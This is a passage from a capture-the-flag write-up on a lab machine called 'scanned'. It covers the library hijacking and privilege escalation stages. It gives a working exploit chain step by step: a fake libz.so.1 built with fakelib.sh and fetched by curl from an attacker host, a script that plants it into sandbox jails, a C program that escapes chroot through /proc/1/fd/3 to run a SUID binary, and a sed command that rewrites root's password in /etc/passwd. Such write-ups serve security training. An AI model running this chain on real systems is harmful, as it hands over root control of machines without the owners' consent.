+</code></pre></div><h2 id=library-hijacking>Library Hijacking</h2><p>Now we have the ability to run the <code>sandbox</code> from the machine and perform more actions with prepared malware.</p><p>For instance, we can run SUID binaries and copy shared libraries from inside the jail so that the malware can use them and run commands as <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ find / -perm -4000 2>/dev/null  
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/umount
+</code></pre></div><p>Let&rsquo;s check which shared libraries they need to run properly: <code>fusermount</code> needs the libraries that are already inside the jail, which are needed for <code>/bin/sh</code> as well:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ ldd /usr/bin/fusermount
+        linux-vdso.so.1 (0x00007ffe36170000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1fb50e4000)  
+        /lib64/ld-linux-x86-64.so.2 (0x00007f1fb52ba000)
+<span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ ldd /bin/sh
+        linux-vdso.so.1 (0x00007ffe3d5a6000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc39def7000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fc39e0e5000)
+</code></pre></div><p>To craft a malicious Glibc shared library, we can use <a href=https://github.com/eblazquez/fakelib.sh><code>fakelib.sh</code></a>. First, we must download the <code>libc.so.6</code> library to our attacker machine.</p><p>However, using <a href=https://github.com/eblazquez/fakelib.sh><code>fakelib.sh</code></a> on <code>libc.so.6</code> might not run correcty. After some tests, I found that <code>/usr/lib/openssh/ssh-keysign</code> is SUID and uses <code>libz.so.1</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ ldd /usr/lib/openssh/ssh-keysign
+/usr/lib/openssh/ssh-keysign:
+        linux-vdso.so.1 (0x00007ffdbe9e8000)
+        libcrypto.so.1.1 => /lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f72529b4000)  
+        libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007f7252997000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f72527d2000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f72527cc000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f72527aa000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f7252d27000)
+</code></pre></div><p>So we need to download <code>libz.so.1</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ cd /
+<span class=code-green>clarence@scanned</span>:<span class=code-blue>/</span>$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>wget</span> -q 10.10.11.141:1234/lib/x86_64-linux-gnu/libz.so.1  
+</code></pre></div><p>This library <code>libz.so.1</code> won&rsquo;t cause errors with <a href=https://github.com/eblazquez/fakelib.sh><code>fakelib.sh</code></a> (maybe because it is smaller than <code>libc.so.6</code>). Now we can craft a fake library to see if the attack works:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>fakelib.sh</span> -l <span class=mtku>libz.so.1</span> -o fakelibz.so.1 -g  
+Generating fake library under fakelibz.so.1
+
+<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/</span>$ cd /tmp
+<span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  
+</code></pre></div><p>We need to use a Bash script (<code>.copy.sh</code>) to run it right after the <code>sandbox</code> binary in order to copy all the needed files into the jail:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>bash</span>
+
+<span class=mtk1>dir=/var/www/malscanner/sandbox/jails</span>
+
+<span class=mtk5>for</span> <span class=mtk1>jail</span> <span class=mtk5>in</span> <span class=mtk4>$(ls</span> <span class=mtk1>$dir</span><span class=mtk4>)</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libcrypto.so.1.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>  
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libdl.so.2</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libpthread.so.0</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+
+        <span class=mtk1>cp</span> <span class=mtk1>/tmp/.libz.so.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/libz.so.1</span>
+<span class=mtk5>done</span>
+</code></pre></div><p>And the malware binary will be compiled from this simple C script (<code>.exploit.c</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;unistd.h&gt;</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+  <span class=mtk8>sleep</span><span class=mtk1>(</span><span class=mtk6>2</span><span class=mtk1>);</span>
+  <span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk4>"/proc/1/fd/3/../../../../../usr/lib/openssh/ssh-keysign"</span><span class=mtk1>);</span>  
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Notice that we are running <code>ssh-keysign</code> escaping from <code>chroot</code>, so that it executes as a SUID binary.</p><p>After writing them on the machine, we must run <code>sandbox</code> and right after run the Bash script (notice that I added the <code>sleep(2)</code> to have some time in between). It is kind of a race condition. We will need two different SSH sessions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> clarence@10.10.11.141
+clarence@10.10.11.141's password:
+<span class=code-green>clarence@scanned</span>:<span class=code-blue>~</span>$ cd /var/www/malscanner/sandbox
+<span class=code-green>clarence@scanned</span>:<span class=code-blue>/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ bash .copy.sh  
+</code></pre></div><p>And we will see this output:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
+Library hijacked!
+Exited
+Kill err: (3)
+</code></pre></div><p>So the attack has worked. Now we can run a custom command using <a href=https://github.com/eblazquez/fakelib.sh><code>fakelib.sh</code></a>. The script provides the use of <code>bash</code> setting UID/GID to EUID/EGID:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> <span class=mtku>fakelib.sh</span> -l <span class=mtku>libz.so.1</span> -o fakelibz.so.1 -g -p bash  
+Generating fake library under fakelibz.so.1
+
+<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  
+</code></pre></div><p>Moreover, we need to copy <code>/bin/bash</code> and more shared libraries into the jail:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ ldd /bin/bash
+        linux-vdso.so.1 (0x00007fff80bec000)
+        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fd3ac155000)  
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fd3ac14f000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd3abf8a000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fd3ac2c4000)
+</code></pre></div><p>So this is the updated <code>.copy.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>bash</span>
+
+<span class=mtk1>dir=/var/www/malscanner/sandbox/jails</span>
+
+<span class=mtk5>for</span> <span class=mtk1>jail</span> <span class=mtk5>in</span> <span class=mtk4>$(ls</span> <span class=mtk1>$dir</span><span class=mtk4>)</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libcrypto.so.1.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>  
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libdl.so.2</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libpthread.so.0</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libtinfo.so.6</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+
+        <span class=mtk1>cp</span> <span class=mtk1>/bin/bash</span> <span class=mtk1>$dir/$jail/bin</span>
+
+        <span class=mtk1>cp</span> <span class=mtk1>/tmp/.libz.so.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/libz.so.1</span>
+<span class=mtk5>done</span>
+</code></pre></div><p>Now we perform the attack again:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ bash .copy.sh  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
+bash-5.1# Killed subprocess
+Exited
+</code></pre></div><p>Notice the <code>#</code>, so we got <code>bash</code> executed as <code>root</code>, but it gets killed after 5 seconds&mldr;</p><h2 id=privilege-escalation>Privilege escalation</h2><p>In order to get a proper shell as <code>root</code>, I decided to modify <code>/etc/passwd</code> and set a given password for <code>root</code> using <code>openssl</code> (DES Unix format):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>openssl</span> passwd 7rocky  
+gf2QeNVUpedfI
+</code></pre></div><p>To modify <code>/etc/passwd</code> I will use <code>sed</code>, so again I will need to copy <code>/usr/bin/sed</code> and more shared libraries into the jail:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ ldd /usr/bin/sed
+        linux-vdso.so.1 (0x00007fffcbeea000)
+        libacl.so.1 => /lib/x86_64-linux-gnu/libacl.so.1 (0x00007fe73de49000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fe73de1d000)  
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe73dc58000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fe73dbc0000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe73dbba000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fe73de7a000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe73db98000)
+</code></pre></div><p>This is the updated <code>.copy.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>bash</span>
+
+<span class=mtk1>dir=/var/www/malscanner/sandbox/jails</span>
+
+<span class=mtk5>for</span> <span class=mtk1>jail</span> <span class=mtk5>in</span> <span class=mtk4>$(ls</span> <span class=mtk1>$dir</span><span class=mtk4>)</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libacl.so.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libcrypto.so.1.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>  
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libdl.so.2</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libpcre2-8.so.0</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libpthread.so.0</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libselinux.so.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/lib/x86_64-linux-gnu/libtinfo.so.6</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/</span>
+
+        <span class=mtk1>cp</span> <span class=mtk1>/bin/bash</span> <span class=mtk1>$dir/$jail/bin</span>
+        <span class=mtk1>cp</span> <span class=mtk1>/usr/bin/sed</span> <span class=mtk1>$dir/$jail/bin</span>
+
+        <span class=mtk1>cp</span> <span class=mtk1>/tmp/.libz.so.1</span> <span class=mtk1>$dir/$jail/lib/x86_64-linux-gnu/libz.so.1</span>
+<span class=mtk5>done</span>
+</code></pre></div><p>We need to copy this command into clipboard in order to paste it as soon as we get the <code>root</code> shell (notice that we use <code>/proc/1/fd/3/../../../../../etc/passwd</code> to escape from <code>chroot</code> again):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>/bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd  
+</code></pre></div><p>Now we perform the library hijacking attack again:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ bash .copy.sh  
+</code></pre></div><p>Quickly, copy the command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit
+Exited
+bash-5.1# /bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd  
+bash-5.1# Kill err: (3)
+</code></pre></div><p>And&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ head -1 /etc/passwd
+root:gf2QeNVUpedfI:0:0:root:/root:/bin/bash  
+</code></pre></div><p>We modified <code>/etc/passwd</code>, so we have access as <code>root</code> (using password <code>7rocky</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>clarence@scanned</span>:<span class=code-blue>/tmp</span>$ su root
+Password:
+root@scanned:/tmp# cat /root/root.txt  
+8f587d54e14d5747055bb717dd2cc520
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#analyzing-sandbox-code>Analyzing sandbox code</a></li><li><a href=#analyzing-web-application>Analyzing web application</a></li><li><a href=#abusing-misconfigurations>Abusing misconfigurations</a></li><li><a href=#foothold-on-the-machine>Foothold on the machine</a></li><li><a href=#library-hijacking>Library Hijacking</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
